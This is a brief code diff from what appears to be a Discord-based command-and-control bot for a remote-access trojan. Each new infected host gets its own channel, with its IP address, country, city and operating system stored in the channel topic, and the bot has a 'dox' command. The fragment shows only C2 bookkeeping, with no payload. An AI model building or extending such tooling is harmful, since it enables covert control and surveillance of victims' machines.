@@ -39,14 +39,7 @@ def main():
             print(f"Created new channel: {channel_name}")
             channel_id = discord.utils.get(bot.get_all_channels(), name=identifier)
             c2 = bot.get_channel(channel_id.id)
-
-            await c2.send(f"-------------------------------------------------------"
-                        f"\nNew Connection:\n\n"
-                        f"{ip}\n"
-                        f"{country}, {city}\n"
-                        f"{os}\n\n"
-                        f"!get_help for help\n"
-                        f"-------------------------------------------------------")
+            await c2.edit(topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {os}")
 
     @bot.command()
     async def dox(ctx):
